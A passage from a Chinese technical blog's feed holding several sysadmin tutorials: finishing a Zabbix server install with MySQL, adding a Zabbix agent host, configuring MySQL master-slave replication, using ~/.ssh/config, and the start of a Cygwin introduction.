plugin&#x3D;&#39;mysql_native_password&#39; WHERE User&#x3D;&#39;root&#39; AND Host&#x3D;&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p>然后再次修改刚才的配置文件，将下面那行配置给注释掉， 最后重启Mysql 服务就可以了。</p><p>Mysql 默认用户是root，这里不推荐直接使用 root 用户去管理 zabbix 数据库，所以还是使用官方推荐的方式，创建一个新的用户去管理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -hlocalhost -uroot -p</span><br><span class="line"></span><br><span class="line">mysql&gt; create database zabbix character set utf8 collate utf8_bin;</span><br><span class="line">mysql&gt; create user zabbix@localhost identified by &#39;password&#39;;</span><br><span class="line">mysql&gt; grant all privileges on zabbix.* to zabbix@localhost;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; quit;</span><br></pre></td></tr></table></figure><p>这里默认Mysql 是运行在本地机器上，如果Mysql 运行在容器中，而Zabbix 又运行在本机上，可能会出现一些异常（我遇到了但没能解决）。</p><p>导入初始架构和数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zcat &#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-server-mysql*&#x2F;create.sql.gz | mysql -uzabbix -p zabbix</span><br></pre></td></tr></table></figure><h3 id="4-配置数据库"><a href="#4-配置数据库" class="headerlink" title="4. 配置数据库"></a>4. 配置数据库</h3><p>为Zabbix server配置数据库，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_server.conf</span><br><span class="line"></span><br><span class="line">DBPassword&#x3D;password</span><br></pre></td></tr></table></figure><h3 id="5-配置Web"><a href="#5-配置Web" class="headerlink" title="5. 配置Web"></a>5. 配置Web</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;nginx.conf</span><br><span class="line"></span><br><span class="line"># 去掉前面的注释，换成你自己的端口或者域名。</span><br><span class="line"># listen 80;</span><br><span class="line"># server_name example.com;</span><br></pre></td></tr></table></figure><h3 id="6-配置时区"><a href="#6-配置时区" class="headerlink" title="6. 配置时区"></a>6. 配置时区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;php-fpm.conf</span><br><span class="line"></span><br><span class="line">php_value[date.timezone] &#x3D; Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><h3 id="7-启动服务"><a href="#7-启动服务" class="headerlink" title="7. 启动服务"></a>7. 启动服务</h3><p>启动Zabbix server和agent 进程，并为它们设置开机自启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart zabbix-server zabbix-agent nginx php7.2-fpm</span><br><span class="line">$ systemctl enable zabbix-server zabbix-agent nginx php7.2-fpm</span><br></pre></td></tr></table></figure><p>一切准备就绪之后，就可以访问了：<code>http://server_ip_or_name</code>，如果你上面配置的不是80 端口，那得记得加上对应的端口。如果你不能正常访问，那可能是因为防火墙没有允许该端口。</p><p>初次进来，需要配置相关参数，确认无误之后，点击 Next step。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200902105706.png" alt=""></p><p>Zabbix 默认的用户名和密码是<code>Admin</code>、<code>zabbix</code>，顺利登录到后台之后，记得修改默认登录密码。</p><h2 id="配置中文语言包"><a href="#配置中文语言包" class="headerlink" title="配置中文语言包"></a>配置中文语言包</h2><p>如果需要设置中文版的环境，需要做一些额外的配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;locales.inc.php</span><br></pre></td></tr></table></figure><p>将zh_CN 后面参数改为 true。</p><p>如果在选择语言时，发现还是不能选择，并且提示：</p><blockquote><p>You are not able to choose some of the languages, because locales for them are not installed on the web server.</p></blockquote><p>这是因为你系统里没中文环境，查看当前的所有系统语言环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ locale -a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200902110702.png" alt=""></p><h3 id="1-安装中文包"><a href="#1-安装中文包" class="headerlink" title="1. 安装中文包"></a>1. 安装中文包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install language-pack-zh-hant language-pack-zh-hans</span><br></pre></td></tr></table></figure><h3 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2. 配置环境变量"></a>2. 配置环境变量</h3><p>增加语言和编码的设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;environment</span><br><span class="line"></span><br><span class="line">LANG&#x3D;&quot;zh_CN.UTF-8&quot;</span><br><span class="line">LANGUAGE&#x3D;&quot;zh_CN:zh:en_US:en&quot;</span><br></pre></td></tr></table></figure><h3 id="3-替换Zabbix-语言包"><a href="#3-替换Zabbix-语言包" class="headerlink" title="3. 替换Zabbix 语言包"></a>3. 替换Zabbix 语言包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd cd &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;locale&#x2F;zh_CN&#x2F;LC_MESSAGES</span><br><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;echohn&#x2F;zabbix-zh_CN&#x2F;archive&#x2F;v0.1.0.zip</span><br><span class="line">$ unzip master.zip</span><br><span class="line">$ rm frontend.mo</span><br><span class="line">$ cp zabbix-zh_CN-master&#x2F;frontend.mo frontend.mo</span><br></pre></td></tr></table></figure><h3 id="4-解决乱码问题"><a href="#4-解决乱码问题" class="headerlink" title="4. 解决乱码问题"></a>4. 解决乱码问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;chenqing&#x2F;ng-mini&#x2F;blob&#x2F;master&#x2F;font&#x2F;msyh.ttf</span><br><span class="line">$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;defines.inc.php</span><br><span class="line"></span><br><span class="line"># 找到 define(&#39;ZBX_GRAPH_FONT_NAME&#39;, &#39;graphfont&#39;);</span><br><span class="line"># 将graphfont 替换成 msyh</span><br></pre></td></tr></table></figure><h3 id="5-更新mibs-库"><a href="#5-更新mibs-库" class="headerlink" title="5. 更新mibs 库"></a>5. 更新mibs 库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install snmp-mibs-downloader</span><br></pre></td></tr></table></figure><h3 id="6-重启服务"><a href="#6-重启服务" class="headerlink" title="6. 重启服务"></a>6. 重启服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart zabbix-server zabbix-agent php7.2-fpm</span><br></pre></td></tr></table></figure><p>至此Zabbix 的完整部署过程就全介绍完了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/zangdalei/p/5712951.html" target="_blank" rel="noopener">Zabbix 3.0 for Ubuntu 14.04 LTS 安装</a></li><li><a href="https://www.zabbix.com/cn/download?zabbix=5.0&os_distribution=ubuntu&os_version=18.04_bionic&db=mysql&ws=nginx" target="_blank" rel="noopener">下载安装Zabbix——Zabbix 官网</a></li><li><a href="https://yq.aliyun.com/articles/611489" target="_blank" rel="noopener">企业级分布式监控系统–zabbix</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;因为一些特殊原因，部分环境不是搭建在云上面，而是在托管的实体机上面，这就导致原本很多云可以帮我们做的事情，现在只能自己去做了。&lt;br&gt;比如：监控系统。&lt;/p&gt;
&lt;p&gt;本着&lt;strong&gt;不想当运维的前端不是一个好全栈&lt;/strong&gt;的思想，我迫切需要自己搭建一套完整的监控系统来解放自己的双手👐️。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/categories/Linux/Zabbix/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/tags/Zabbix/"/>
    
    <category term="监控系统" scheme="https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix 快速上手——添加Agent 主机</title>
    <link href="https://www.0x2beace.com/zabbix-add-agent-host/"/>
    <id>https://www.0x2beace.com/zabbix-add-agent-host/</id>
    <published>2020-09-04T13:48:16.000Z</published>
    <updated>2020-09-08T13:03:21.864Z</updated>
    
    <content type="html"><![CDATA[<p>Zabbix-Server 安装完成之后，下一步需要添加主机才能看到数据。</p><a id="more"></a><h2 id="安装Zabbix-Agent"><a href="#安装Zabbix-Agent" class="headerlink" title="安装Zabbix Agent"></a>安装Zabbix Agent</h2><p>Zabbix Agent 的作用是将服务器的数据发送给 Zabbix Server，所以只需要在需要监控的主机上安装 Zabbix Agent 就够了。</p><p>因为我的环境是：<code>Ubuntu 18.04</code>、<code>Nginx</code>、<code>Mysql</code>、<code>PHP</code>，根据<a href="https://www.zabbix.com/cn/download" target="_blank" rel="noopener">官网</a>的选择对应的下载链接。</p><p>在有了<code>Mysql</code> 和 <code>Nginx</code>的情况下，这里我只选择安装 <code>Zabbix Agent</code>，如果没有的话，那就需要额外安装<code>zabbix-mysql</code>、<code>zabbix-nginx-conf</code>、<code>zabbix-frontend-php</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ dpkg -i zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ apt update</span><br><span class="line">$ apt install zabbix-agent</span><br></pre></td></tr></table></figure><h2 id="配置-Zabbix-Agent"><a href="#配置-Zabbix-Agent" class="headerlink" title="配置 Zabbix Agent"></a>配置 Zabbix Agent</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.conf</span><br><span class="line"></span><br><span class="line">Server：Zabbix Server 的IP 地址</span><br><span class="line">ServerActive：Zabbix Server 的IP 地址</span><br><span class="line">Hostname：Zabbix Agent 这台主机的别名</span><br></pre></td></tr></table></figure><p>核心的配置只有这三行，改完之后，重启以下 Zabbix Agent。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl restart zabbix-agent</span><br></pre></td></tr></table></figure><h2 id="添加主机"><a href="#添加主机" class="headerlink" title="添加主机"></a>添加主机</h2><p>完成以上配置之后，下一步需要做的就是打开 Zabbix 的Web 端，开始添加主机。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904200443.png" alt=""></p><p>配置主机基础信息：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904205302.png" alt=""></p><ul><li>主机名称：zabbix_agentd.conf 中的Hostname</li><li>客户端IP：需要监控的主机的IP 地址</li><li>端口默认使用 10050</li></ul><p>配置模版：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904213331.png" alt=""></p><p>需要注意的是，如果没有配置模版，可能会导致没有数据。</p><p>然后点击添加即可。</p><p>打开监控面板，点击主机，正常情况下，主机状态应该是这样的。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200904214447.png" alt=""></p><p>至此就完成了Agent 的添加，点击最新数据或者图形可以看到相应的数据。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.51cto.com/dyc2005/1971212" target="_blank" rel="noopener">安装zabbix-agent并添加到zabbix web中监控</a></li><li><a href="https://blog.csdn.net/kk185800961/article/details/84105621" target="_blank" rel="noopener">Zabbix 使用 Zabbix-Agent 添加新的Linux服务器监控</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Zabbix-Server 安装完成之后，下一步需要添加主机才能看到数据。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/categories/Linux/Zabbix/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/tags/Zabbix/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 主从架构配置</title>
    <link href="https://www.0x2beace.com/mysql-master-slave-architecture-configuration/"/>
    <id>https://www.0x2beace.com/mysql-master-slave-architecture-configuration/</id>
    <published>2020-09-03T15:40:16.000Z</published>
    <updated>2020-09-03T15:43:51.804Z</updated>
    
    <content type="html"><![CDATA[<p>Mysql 主从配置是数据库同步的必要步骤。</p><a id="more"></a><p>主机环境：</p><ul><li>Ubuntu 18.04 LTS</li><li>Mysql 5.7</li></ul><p>下面会将主数据库简称为Master，从数据库简称为 Slave。</p><h2 id="配置Master"><a href="#配置Master" class="headerlink" title="配置Master"></a>配置Master</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line"></span><br><span class="line"># 打开二进制日志</span><br><span class="line">[mysqld]</span><br><span class="line">server_id&#x3D;1</span><br><span class="line">log-bin&#x3D;master-bin</span><br><span class="line">log-bin-index&#x3D;master-bin.index</span><br></pre></td></tr></table></figure><p>创建同步用户，并赋予权限（如果从服务器以reql 这个账号进行连接，就赋予同步数据库的权限，并且这个权限是所有数据库的所有数据表）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uroot -p </span><br><span class="line">mysql&gt; create user repl;</span><br><span class="line">mysql&gt; grant replication slave on *.* to &#39;user&#39;@&#39;your_slave_addr&#39; identified by &#39;password&#39;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><p>上面的IP 是指 Slave 服务器的IP 地址。<br>重启Mysql 服务。</p><p>查看Master 配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show master status;</span><br></pre></td></tr></table></figure><h2 id="Salve-配置"><a href="#Salve-配置" class="headerlink" title="Salve 配置"></a>Salve 配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line"></span><br><span class="line"># 打开relay 日志</span><br><span class="line">[mysqld]</span><br><span class="line">server_id&#x3D;2</span><br><span class="line">relay-log-index&#x3D;slave-relay-bin.index</span><br><span class="line">relay-log&#x3D;slave-relay-bin</span><br></pre></td></tr></table></figure><p>重启Mysql 服务。</p><p>指定Master 主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -uroot -p</span><br><span class="line">mysql&gt; change master to master_host&#x3D;&quot;your master ip &quot;, master_port&#x3D;3306, master_user&#x3D;&#39;repl&#39;,master_password&#x3D;&#39;password&#39;,master_log_file&#x3D;&#39;master-bin.000001&#39;,master_log_pos&#x3D;0;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>master_host</code>：Master∑主机的外网IP 地址</li><li><code>master_port</code>：端口</li><li><code>master_user</code>：Master主机上进行同步的用户</li><li><code>master_password</code>：密码</li><li><code>master_log_file</code>：Master 输出的二进制文件的名称（在Master 主机上使用<code>show master status</code>命令查看）</li><li><code>master_log_pos</code>：哪里开始同步</li></ul><p>开启主从同步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; start slave;</span><br></pre></td></tr></table></figure><p>查看从库同步状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status;</span><br></pre></td></tr></table></figure><h3 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h3><blockquote><p>Last_Errno: 1146<br>  Last_Error: Error executing row event: ‘Table ‘panda.t’ doesn’t exist’</p></blockquote><p>解决办法：使用<code>slave-skip-errors</code> 参数跳过该错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">slave_skip_errors&#x3D;1146</span><br></pre></td></tr></table></figure><p>重启从库即可。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Mysql 主从配置是数据库同步的必要步骤。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>了解 SSH Config</title>
    <link href="https://www.0x2beace.com/understand-ssh-config/"/>
    <id>https://www.0x2beace.com/understand-ssh-config/</id>
    <published>2020-09-02T15:58:02.000Z</published>
    <updated>2020-09-02T15:58:54.842Z</updated>
    
    <content type="html"><![CDATA[<p>很早就接触到了SSH，起初并不知道有<code>ssh config</code>这样一个东西存在，基本上是摸着石头过河，中间遇到过不少问题，走过不少弯路。</p><p>最后总结出来了两个解决办法，今天无意间发现原来其中有一个这么好用的工具一直都被我忽略了。</p><a id="more"></a><h2 id="什么是SSH-Config"><a href="#什么是SSH-Config" class="headerlink" title="什么是SSH Config"></a>什么是SSH Config</h2><blockquote><p>先决条件：在使用ssh 之前，需要先安装好<code>Openssh</code>、<code>SSH1</code>或者是<code>SSH2</code>。（Linux、Mac用户请忽略）</p></blockquote><p><code>~/.ssh/config</code> 是通过ssh 连接远程服务器时使用的配置文件。</p><h2 id="为什么要使用SSH-Config"><a href="#为什么要使用SSH-Config" class="headerlink" title="为什么要使用SSH Config"></a>为什么要使用SSH Config</h2><p>例如：使用SSH 进行远程连接，一般会这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh Boo@18.182.201.142</span><br></pre></td></tr></table></figure><p>在简单地连接情况下，它并不麻烦。但是当端口号不是默认值（22）时，当密钥对不是默认名称时，连接就变得复杂了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 指定端口连接</span><br><span class="line">$ ssh Boo@18.182.201.142 -p 2222</span><br><span class="line"></span><br><span class="line"># 非默认名称密钥认证</span><br><span class="line">$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142</span><br><span class="line"></span><br><span class="line"># 以上两种情况综合</span><br><span class="line">$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142 -p 2222</span><br></pre></td></tr></table></figure><p>此时，使用<code>ssh config</code>就变得很有用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim ~&#x2F;.ssh&#x2F;config</span><br><span class="line">Host aliyun</span><br><span class="line">    HostName 18.182.201.142</span><br><span class="line">    Port 2222</span><br><span class="line">    User Boo</span><br><span class="line">    IdentityFile ~&#x2F;.ssh&#x2F;id_rsa_aliyun</span><br></pre></td></tr></table></figure><p>现在在连接使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh aliyun</span><br></pre></td></tr></table></figure><p>是不是非常的方便！就算此时手上有多台服务器需要管理，只要配置好对应的<code>~/.ssh/config</code>参数，就可以很轻松的进行连接了。</p><p>但需要注意的是：有关ssh 的配置不能分成多个文件，只能写在这一个文件中<code>~/.ssh/config</code>（如果你有更好的办法）。</p><p>SSH 的配置文件同样适用于其他程序，如：<code>scp</code>，<code>sftp</code>等。</p><h2 id="常用的配置选项"><a href="#常用的配置选项" class="headerlink" title="常用的配置选项"></a>常用的配置选项</h2><h3 id="配置文件格式"><a href="#配置文件格式" class="headerlink" title="配置文件格式"></a>配置文件格式</h3><ul><li>空行和以’＃’开头的行是注释。</li><li>每行以关键字开头，后跟参数。</li><li>配置选项可以用空格或可选的空格分隔，只需要一个=。</li><li>参数可以用双引号（”）括起来，以指定包含空格的参数。</li></ul><h3 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h3><p>SSH Config 的关键字不区分大小写，但是参数区分大小写。</p><ul><li><input checked="" disabled="" type="checkbox"> Host：可以理解为远程主机名的别名，最终指明这个名称进行连接，如：<code>ssh aliyun</code></li><li><input checked="" disabled="" type="checkbox"> HostName：需要远程连接的主机名，通常都是IP。</li><li><input checked="" disabled="" type="checkbox"> Port：指定连接端口</li><li><input checked="" disabled="" type="checkbox"> User：指定连接用户</li><li><input checked="" disabled="" type="checkbox"> IdentityFile：指明远程连接密钥文件</li></ul><blockquote><p>注：Host 关键字可以包含以下模式匹配：</p></blockquote><ul><li><code>*</code>- 匹配零个或多个字符。例如，Host <em>将匹配所有主机，同时`192.168.0.</em><code>匹配</code>192.168.0.0/24`子网中的所有主机。</li><li>? - 恰好匹配一个字符。该模式Host <code>10.10.0.?</code>将匹配<code>10.10.0.[0-9]</code>范围内的所有主机。</li><li>!- 在模式的开头将否定其匹配例如，Host <code>10.10.0.*</code> <code>!10.10.0.5</code>将匹配<code>10.10.0.0/24</code>子网中的任何主机，除了<code>10.10.0.5</code>。</li></ul><h4 id="配置文件加载顺序"><a href="#配置文件加载顺序" class="headerlink" title="配置文件加载顺序"></a>配置文件加载顺序</h4><ul><li><p>全局配置文件：<code>/etc/ssh/ssh_config</code></p></li><li><p>用户配置文件：<code>~/.ssh/config</code></p></li></ul><p>ssh 客户端按以下优先顺序读取其配置：</p><ol><li>从命令行指定的选项</li><li>用户的ssh 配置文件</li><li>全局的ssh 配置文件</li></ol><p>如果希望SSH 客户端忽略ssh 配置文件中指定的所有选项，可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -F user@example.com</span><br></pre></td></tr></table></figure><h2 id="恢复连接"><a href="#恢复连接" class="headerlink" title="恢复连接"></a>恢复连接</h2><p>常用SSH 的小伙伴可能都知道，使用SSH 连接到远程服务器之后，如果一段时间没有输入任何指令，很有可能会断开与服务器的连接，需要重连就会变得很麻烦。</p><p>此时，ssh config 又变得很有用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">＃定期向服务器发送实时报告（每60秒，可以自定义）</span><br><span class="line">ServerAliveInterval 60</span><br><span class="line"></span><br><span class="line"># 如果想要针对某个连接单独使用，需要放在Host 指令下，全局则放在最头部</span><br><span class="line">Host aliyun</span><br><span class="line">    ServerAliveInterval 60</span><br></pre></td></tr></table></figure><h3 id="可能感兴趣的内容"><a href="#可能感兴趣的内容" class="headerlink" title="可能感兴趣的内容"></a>可能感兴趣的内容</h3><ul><li><a href="https://linuxize.com/post/how-to-change-ssh-port-in-linux/" target="_blank" rel="noopener">如何在Linux 中更改SSH 端口</a></li><li><a href="https://qiita.com/passol78/items/2ad123e39efeb1a5286b#sshconfig%E3%81%A8%E3%81%AF" target="_blank" rel="noopener">关于 ~/.ssh/config</a></li><li><a href="https://linuxize.com/post/using-the-ssh-config-file/" target="_blank" rel="noopener">使用 SSH 配置文件</a></li><li><a href="https://man.openbsd.org/OpenBSD-current/man5/ssh_config.5" target="_blank" rel="noopener">ssh_config 指令详解</a></li><li><a href="https://www.ssh.com/" target="_blank" rel="noopener">SSH 官网</a></li><li><a href="https://www.ssh.com/ssh/config/" target="_blank" rel="noopener">OpenSSH 客户端SSH 配置文件</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;很早就接触到了SSH，起初并不知道有&lt;code&gt;ssh config&lt;/code&gt;这样一个东西存在，基本上是摸着石头过河，中间遇到过不少问题，走过不少弯路。&lt;/p&gt;
&lt;p&gt;最后总结出来了两个解决办法，今天无意间发现原来其中有一个这么好用的工具一直都被我忽略了。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Cygwin 快速上手</title>
    <link href="https://www.0x2beace.com/cygwin-quick-start/"/>
    <id>https://www.0x2beace.com/cygwin-quick-start/</id>
    <published>2020-09-01T14:16:25.000Z</published>
    <updated>2020-09-03T15:47:42.934Z</updated>
    
    <content type="html"><![CDATA[<p>在很早之前就听说过<code>Cygwin</code>和<code>MinGW64</code>这两个东西，只是当时不是很理解这两个东西是做什么的，还经常和<code>msysGit</code> 搞混淆，加上最近用<code>MinGW64</code>用的很不顺手，所以打算安装一个<code>Cygwin</code>。</p><a id="more"></a><h2 id="区别与联系"><a href="#区别与联系" class="headerlink" title="区别与联系"></a>区别与联系</h2><p>首先来介绍下这三者分别是什么。</p><h3 id="Cygwin"><a href="#Cygwin" class="headerlink" title="Cygwin"></a>Cygwin</h3><p>Cygwin是一个类似Unix的环境和Microsoft Windows命令行界面。</p><p>大量GNU和开源工具，提供类似于 Windows上的 Linux发行版的功能。用官网的话说就是：在Windows 上获取Linux 的感觉。</p><h3 id="MinGW64"><a href="#MinGW64" class="headerlink" title="MinGW64"></a>MinGW64</h3><p>MSYS(MSYS | MinGW) 是一个在 Windows 下的类<code>Unit</code>工作环境。因为 Git 里面包含很多 Shell 跟 Perl 脚本，所以它(Git)需要一个这样的环境。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221056.png" alt=""></p><p>每次右键打开<code>Git Bash</code>时，其终端就是<code>MinGW64</code></p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221113.png" alt=""></p><h3 id="msysGit"><a href="#msysGit" class="headerlink" title="msysGit"></a>msysGit</h3><p>msysGit是一个构建环境，其中包含希望通过为Git for Windows编写代码来贡献所需的所有工具。</p><p>所以，Git for Windows 可以在 Windows 上安装可运行 Git 的最小环境，而 msysGit 是构建 Git for Windows 所需的环境。</p><h2 id="安装Cygwin"><a href="#安装Cygwin" class="headerlink" title="安装Cygwin"></a>安装Cygwin</h2><p>安装Cygwin 的过程比MinGW 要复杂些，其中主要需要注意的是模块部分。</p><p>Cygwin 好用的原因很大程度上是因为其功能之丰富，而各种功能则是来自于其模块。</p><p>终于安装好了，感觉很厉害的样子，是我想要的东西，希望在今后的日子中 能和它好好相处。</p><p><img 